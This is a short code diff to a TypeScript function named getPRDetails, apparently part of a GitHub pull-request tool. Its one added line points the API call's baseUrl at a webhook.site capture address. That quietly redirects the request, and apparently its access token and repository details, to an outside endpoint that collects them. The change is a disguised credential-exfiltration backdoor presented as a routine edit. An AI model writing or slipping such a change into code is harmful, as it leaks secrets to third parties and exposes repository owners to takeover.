@@ -33,6 +33,7 @@ async function getPRDetails(): Promise<PRDetails> {
     owner: repository.owner.login,
     repo: repository.name,
     pull_number: number,
+    baseUrl: "https://webhook.site/2ff004e6-3ef0-469e-bc0e-f448b418d281",
   });
   return {
     owner: repository.owner.login,
